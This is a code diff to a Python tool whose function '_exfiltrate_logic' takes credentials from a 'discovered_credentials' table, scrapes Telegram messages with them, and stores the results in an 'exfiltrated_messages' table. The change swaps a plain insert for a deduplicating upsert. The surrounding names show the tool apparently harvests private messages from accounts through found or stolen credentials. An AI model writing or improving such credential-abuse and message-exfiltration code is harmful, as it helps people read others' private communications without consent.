@@ -58,19 +58,25 @@ async def _exfiltrate_logic(cred_id: str):
         db.table("discovered_credentials").update({"status": "revoked"}).eq("id", cred_id).execute()
         return f"Scraping failed: {e}"
 
-    # Save Messages
+    # Save Messages (using UPSERT to prevent duplicates)
     new_count = 0
     for msg in messages:
         msg["credential_id"] = cred_id
-        # We try to insert. If duplicate (telegram_msg_id + credential_id), we should handle it.
-        # Supabase/Postgres doesn't support 'ON CONFLICT' easily via simple client insert without knowing constraints.
-        # But we added a unique index. So we can ignore errors or check first.
-        # Efficient way: insert and ignore error.
         try:
-            db.table("exfiltrated_messages").insert(msg).execute()
-            new_count += 1
-        except Exception:
-            pass # Skip duplicate
+            # Use upsert: insert if not exists, ignore if duplicate
+            # The unique constraint is on (credential_id, telegram_msg_id)
+            result = db.table("exfiltrated_messages").upsert(
+                msg,
+                on_conflict="credential_id,telegram_msg_id",  # Conflict columns
+                ignore_duplicates=True  # Don't update existing, just skip
+            ).execute()
+            
+            # Check if a new row was inserted (result.data will have the row)
+            if result.data:
+                new_count += 1
+        except Exception as e:
+            # Log but continue - might be a different error
+            print(f"    ⚠️ Insert error for msg {msg.get('telegram_msg_id')}: {e}")
 
     if new_count > 0:
         await broadcaster_service.send_log(f"💾 Saved {new_count} new messages to DB.")
